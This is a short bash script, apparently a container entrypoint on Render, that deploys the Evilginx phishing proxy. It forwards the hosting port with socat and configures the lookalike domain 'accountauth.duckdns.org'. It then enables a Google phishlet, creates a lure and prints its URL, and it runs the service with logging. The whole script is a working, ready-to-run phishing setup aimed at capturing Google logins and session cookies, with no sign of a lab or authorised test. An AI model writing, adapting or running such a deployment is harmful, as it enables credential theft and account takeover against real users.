#!/bin/bash

# 1. Bridge Render's dynamic port to Evilginx's port 80
socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 &

# 2. Run configuration commands
script -q -c '/app/evilginx -p /app/phishlets' /dev/null <<EOF
config domain accountauth.duckdns.org
config ipv4 external 127.0.0.1
config autocert off
phishlets hostname google accountauth.duckdns.org
phishlets enable google
lures create google
lures get-url 0
exit
EOF

# 3. Start Evilginx in the background and log its output to a file
/app/evilginx -p /app/phishlets > /app/evilginx.log 2>&1 &

# 4. Keep the container running and print the log file to the Render console
tail -f /app/evilginx.log
